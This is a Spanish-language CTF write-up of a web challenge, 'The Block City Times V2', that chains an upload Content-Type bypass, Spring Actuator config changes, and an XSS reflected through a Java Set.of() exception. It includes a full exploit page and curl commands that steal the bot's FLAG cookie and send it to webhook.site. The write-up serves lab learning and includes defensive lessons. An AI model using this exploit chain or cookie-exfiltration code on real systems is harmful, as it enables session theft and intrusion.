# The Block City Times V2 — UMassCTF 2026 (WEB)

| Campo       | Valor                                   |
|-------------|-----------------------------------------|
| Plataforma  | UMassCTF 2026                           |
| Categoría   | Web Exploitation                        |
| Dificultad  | Medium                                  |
| Puntos      | 0 (solve script leaked on release)      |
| Tags        | XSS, Spring Boot, Content Negotiation   |

## Descripción

> The Block City Times is here to inform you even better!
>
> (NOTE: Solve script was accidentally revealed on release, as such, this challenge is worth ZERO points and will not affect your ranking. You are still welcome to play & solve it for learning purposes.)

## TL;DR

Multi-stage XSS: misma upload bypass que v1 (text/plain → text/html), misma cadena actuator para activar dev mode, pero el path traversal (/api/../files/) está parchado con regex estricta. El nuevo vector explota Set.of() de Java: inyectar tags duplicados con payload XSS en dos artículos → GET /api/tags lanza IllegalArgumentException: duplicate element: <script>... → GlobalExceptionHandler refleja el mensaje sin Content-Type explícito → Spring negocia text/html para el Accept del navegador → XSS ejecuta en el report-runner → exfiltración del FLAG cookie.

## Arquitectura (igual que v1)

```
                        editorial-net (internal, no internet)
  ┌──────────┐    ┌──────────────┐   ┌──────────────┐
  │editorial │    │     app      │   │report-runner  │
  │(Puppeteer│◄──►│(Spring Boot) │◄──►│(Puppeteer)   │
  │ :9000)   │    │   :8080      │   │   :9001)      │
  └──────────┘    └──────┬───────┘   └───────┬───────┘
  NO internet       editorial-net +      editorial-net
                       web net          + web net
                           │                  │
                      ┌────┴──────────────────┴────┐
                      │     web network (internet) │
                      └────────────────────────────┘
```

- **app** (Spring Boot): web app, redes web + editorial-net
- **editorial** (Puppeteer): visita archivos subidos como admin, solo editorial-net (sin internet)
- **report-runner** (Puppeteer): setea FLAG cookie, visita endpoint configurable, redes web + editorial-net (CON internet)

## Qué cambió de v1 a v2

### 1. ReportController — Path traversal eliminado

**v1** — check trivial:
```java
if (!endpoint.startsWith("/api/")) {
    return "redirect:/admin?error=reportbadendpoint";
}
// envía endpoint original al report-runner
```
Bypass: `/api/../files/UUID-exploit.html` pasa el startsWith.

**v2** — validación en profundidad:
```java
// Bloquea .. y % directamente
if (endpoint.contains("..") || endpoint.contains("%")) {
    return "redirect:/admin?error=reportbadendpoint";
}

// Parsea como URI y normaliza
URI uri = URI.create(endpoint);
String normalized = uri.normalize().getPath();

// Regex estricta: solo alfanuméricos, /, _, -
if (normalized == null || !normalized.matches("^/api/[a-zA-Z0-9/_-]+$")) {
    return "redirect:/admin?error=reportbadendpoint";
}

// Envía SOLO el path normalizado (sin query params ni fragments)
.body(Map.of("endpoint", normalized))
```

- No dots (.) permitidos → no extensions .html
- No % → no URL encoding
- No .. → no path traversal
- Solo envía normalized → query params descartados

### 2. /files/** requiere ADMIN

```java
.requestMatchers("/files/**").hasRole("ADMIN")
```

En v1 los archivos eran públicos. En v2 se requiere sesión admin.

### 3. Todo lo demás idéntico

- Misma upload bypass (Content-Type client-controlled vs Files.probeContentType)
- Misma cadena actuator (env POST + refresh)
- Misma topología Docker
- Mismo editorial bot y report-runner

## Vulnerabilidades explotadas

### 1. Content-Type Mismatch en upload (igual que v1)

Upload verifica `file.getContentType()` (controlado por cliente) contra allowlist text/plain, application/pdf. Serving usa `Files.probeContentType()` que mira la extensión del archivo. Subir .html con Content-Type: text/plain → aceptado → servido como text/html → XSS.

### 2. Spring Boot Actuator env POST (igual que v1)

/actuator/env POST habilitado. Permite cambiar app.enforce-production=false y app.active-config=dev en runtime. La sesión del editorial bot (form-login) funciona porque Spring Security comparte contexto de sesión entre filter chains.

### 3. Set.of() Exception Message Reflection (NUEVO en v2)

ArticleService.allTags():
```java
public Set<String> allTags() {
    return Set.of(ARTICLES.stream()
        .flatMap(a -> a.getTags().stream())
        .toArray(String[]::new));
}
```

Set.of() en Java lanza `IllegalArgumentException("duplicate element: " + element)` si hay elementos duplicados. Si el elemento duplicado ES un payload XSS, el mensaje contiene HTML ejecutable.

### 4. Content-Type Negotiation → text/html (NUEVO en v2)

GlobalExceptionHandler.handle500():
```java
@ExceptionHandler(Exception.class)
public ResponseEntity<String> handle500(Exception ex) {
    boolean isDev = "dev".equals(props.getActiveConfig());
    String body = isDev && ex.getMessage() != null
            ? "500 Internal Server Error: " + ex.getMessage()
            : "500 Internal Server Error";
    return ResponseEntity.status(HttpStatus.INTERNAL_SERVER_ERROR)
            .body(body);  // <-- NO .contentType() explícito
}
```

Sin Content-Type explícito, Spring hace content negotiation:
1. Puppeteer envía Accept: text/html,application/xhtml+xml,...
2. StringHttpMessageConverter soporta text/plain y */*
3. */* es compatible con text/html (preferido por el cliente, q=1.0)
4. Spring escribe la respuesta con Content-Type: text/html
5. El navegador renderiza el body como HTML → <script> ejecuta

### 5. CSRF deshabilitado para /api/**

```java
.csrf(csrf -> csrf.ignoringRequestMatchers("/api/**"));
```

Permite que el XSS del editorial bot haga PUT /api/tags/article/{id} sin token CSRF.

## Cadena de ataque completa

```
1. Subir exploit.html con Content-Type: text/plain
   └─ Pasa filtro de upload, servido como text/html

2. Editorial bot (admin session) visita /files/UUID-exploit.html
   └─ XSS ejecuta en contexto de app.internal:8080

3. XSS Phase 1 - Activar dev mode:
   a. POST /actuator/env → app.enforce-production=false
   b. POST /actuator/env → app.active-config=dev
   c. POST /actuator/refresh → apply changes

4. XSS Phase 2 - Inyectar tags XSS duplicados:
   a. PUT /api/tags/article/1 → ["<script>exfil</script>", "tag1a"]
   b. PUT /api/tags/article/2 → ["<script>exfil</script>", "tag2a"]
   └─ Mismo string en dos artículos distintos = duplicado en allTags()

5. XSS Phase 3 - Trigger report:
   a. GET /admin → extraer CSRF token
   b. POST /admin/report → endpoint=/api/tags
   └─ Pasa regex ^/api/[a-zA-Z0-9/_-]+$

6. App server llama a report-runner:9001/report

7. Report-runner:
   a. Login como admin
   b. setCookie({name: 'FLAG', value: FLAG})  ← sin httpOnly
   c. page.goto("http://app.internal:8080/api/tags")

8. GET /api/tags → allTags() → Set.of() con duplicados
   └─ IllegalArgumentException: duplicate element: <script>...</script>

9. handle500() refleja mensaje → Content-Type: text/html (negotiated)
   └─ Navegador renderiza como HTML

10. <script> ejecuta en report-runner (tiene internet)
    └─ new Image().src = "https://webhook.site/UUID?c=" + document.cookie
    └─ FLAG exfiltrado
```

## Exploit

```html
<html><body><script>
(async()=>{
  const EXFIL="https://webhook.site/WEBHOOK_UUID";
  const base=window.location.origin;

  // Phase 2: report-runner context — exfiltrate FLAG cookie
  if(document.cookie.includes('FLAG')){
    new Image().src=EXFIL+"?phase=flag&c="+encodeURIComponent(document.cookie);
    await new Promise(r=>setTimeout(r,2000));
    return;
  }

  // Phase 1: editorial bot context — chain attack

  // Disable enforce-production via actuator
  await fetch(base+'/actuator/env',{
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({name:'app.enforce-production',value:'false'})
  });

  // Switch to dev mode
  await fetch(base+'/actuator/env',{
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({name:'app.active-config',value:'dev'})
  });

  // Refresh Spring context
  await fetch(base+'/actuator/refresh',{
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body:'{}'
  });

  // Create duplicate XSS tag across two articles
  // Set.of() throws IllegalArgumentException with the element in the message
  // handle500() reflects it without Content-Type -> text/html via negotiation
  const xssTag='<script>new Image().src="'+EXFIL+'?phase=rr_xss&c="+encodeURIComponent(document.cookie)</'+'script>';

  await fetch(base+'/api/tags/article/1',{
    method:'PUT',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify([xssTag,"tag1a"])
  });

  await fetch(base+'/api/tags/article/2',{
    method:'PUT',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify([xssTag,"tag2a"])
  });

  // Get CSRF token and trigger report to /api/tags
  let adminHtml=await(await fetch(base+'/admin')).text();
  let csrf=adminHtml.match(/name="_csrf"[^>]*value="([^"]+)"/)[1];

  let form=new URLSearchParams();
  form.append('endpoint','/api/tags');
  form.append('_csrf',csrf);

  await fetch(base+'/admin/report',{
    method:'POST',
    headers:{'Content-Type':'application/x-www-form-urlencoded'},
    body:form.toString()
  });
})();
</script></body></html>
```

## Ejecución

```bash
# 1. Crear webhook para exfiltración
WEBHOOK=$(curl -s -X POST https://webhook.site/token | python3 -c "import sys,json;print(json.load(sys.stdin)['uuid'])")

# 2. Editar exploit.html con el UUID del webhook
sed -i "s|WEBHOOK_UUID|$WEBHOOK|g" exploit.html

# 3. Obtener CSRF y subir
INST="http://INSTANCE.blockcitytimesv2.web.ctf.umasscybersec.org"
CSRF=$(curl -s -c cookies "$INST/submit" | grep -oP 'name="_csrf"[^>]*value="\K[^"]+' | head -1)
curl -s -b cookies "$INST/submit" \
  -F "_csrf=$CSRF" \
  -F "title=Story" -F "author=test" -F "description=news" \
  -F "file=@exploit.html;type=text/plain"

# 4. Esperar ~10s y comprobar webhook
curl -s "https://webhook.site/token/$WEBHOOK/requests?sorting=newest" | python3 -m json.tool
```

## Diferencia clave v1 vs v2

| Aspecto | v1 | v2 |
|---------|----|----|
| Report endpoint validation | startsWith("/api/") | contains("..") + URI normalize + regex ^/api/[a-zA-Z0-9/_-]+$ |
| Report payload sent | Original string | Normalized path only |
| XSS delivery al report-runner | Path traversal a /files/UUID.html | Reflected XSS via Set.of() exception + Content-Type negotiation |
| /files access | Public | ADMIN only |
| Actuator chain | Identical | Identical |
| Upload bypass | Identical | Identical |

## Flag

```
UMASS{A_mAn_h3s_f0rg0tt3n_t0_ch3ck_f04_p@tH_tr@v3rs@l}
```

## Key Lessons

- **Set.of() como gadget XSS**: Java immutable collections lanzan exceptions con el elemento duplicado en el mensaje. Si ese mensaje se refleja en una respuesta HTTP, es un vector XSS.
- **Content-Type negotiation en Spring**: ResponseEntity<String> sin Content-Type explícito → StringHttpMessageConverter soporta */* → negocia text/html con browsers. Siempre poner .contentType(MediaType.TEXT_PLAIN) explícitamente en error handlers.
- **El fix del path traversal fue correcto pero incompleto**: cerraron la puerta del traversal pero dejaron abierta la ventana de la reflection vía exception messages.
- **CSRF disabled en /api/** combinado con admin session sharing permite a XSS en el editorial bot modificar datos (tags) sin restricción.
- **Self-referencing payload**: el mismo archivo sirve como Phase 1 (editorial bot → configurar ataque) y Phase 2 (report-runner → exfiltrar flag), detectando contexto via document.cookie.includes('FLAG').

## Referencias

- Spring Boot Actuator env POST: https://docs.spring.io/spring-boot/docs/current/reference/html/actuator.html
- Spring Content Negotiation: https://docs.spring.io/spring-framework/reference/web/webmvc/mvc-config/content-negotiation.html
- Java Set.of() duplicate handling: https://docs.oracle.com/en/java/javase/17/docs/api/java.base/java/util/Set.html
- StringHttpMessageConverter: https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/http/converter/StringHttpMessageConverter.html
